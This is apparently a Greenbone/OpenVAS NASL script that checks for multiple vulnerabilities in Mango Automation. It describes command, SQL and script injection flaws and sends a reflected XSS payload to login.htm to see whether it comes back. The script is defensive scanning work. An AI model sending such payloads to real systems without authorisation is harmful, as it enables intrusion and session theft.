# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:infinite_automation_systems:mango_automation";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806065");
  script_version("2024-06-26T05:05:39+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2024-06-26 05:05:39 +0000 (Wed, 26 Jun 2024)");
  script_tag(name:"creation_date", value:"2015-10-01 12:11:26 +0530 (Thu, 01 Oct 2015)");
  script_name("Mango Automation Multiple Vulnerabilities");

  script_tag(name:"summary", value:"Mango Automation is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP POST and
  check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Multiple flaws are due to:

  - Mango Automation contains default configuration for debugging enabled in the
    '/WEB-INF./web.xml' file (debug=true).

  - Improper verification of uploaded image files in
    'graphicalViewsBackgroundUpload' script via the 'backgroundImage' POST
     parameter.

  - Input sanitization error in '/sqlConsole.shtm' script.

  - Improper verification of provided credentials by 'login.htm' script.

  - The POST parameter 'c0-param0' in the testProcessCommand.dwr method is not
    properly sanitised before being used to execute commands.");

  script_tag(name:"impact", value:"Successful exploitation will allow a
  remote attacker to gain extra privileges, to gain access to sensitive
  information, to inject and execute arbitrary os commands, execute arbitrary
  script code in a users browser session, to execute arbitrary SQL commands
  with administrative privileges.");

  script_tag(name:"affected", value:"Mango Automation versions 2.5.2 and
  2.6.0 beta (build 327).");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/38338");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/133732");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/133734");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/133726");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/133733");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_mango_automation_detect.nasl");
  script_mandatory_keys("Mango Automation/Installed");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

url = string(dir, "/login.htm");
req = http_get (item:url, port:port);
res = http_keepalive_send_recv(port:port, data:req);
useragent = http_get_user_agent();

if('content="Mango Automation' >< res && 'id="loginForm' >< res) {
  postData = "username=%22%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E&password=sd";
  req = string("POST ", url, " HTTP/1.1\r\n",
               "Host: ", http_host_name(port:port), "\r\n",
               "User-Agent: ", useragent, "\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postData), "\r\n\r\n",
               postData);
  res = http_keepalive_send_recv(port:port, data:req);
  if(res =~ "^HTTP/1\.[01] 200" && '"><script>alert(document.cookie);</script>"' >< res && "welcomeToMango" >< res) {
    security_message(port:port);
    exit(0);
  }
}

exit(99);
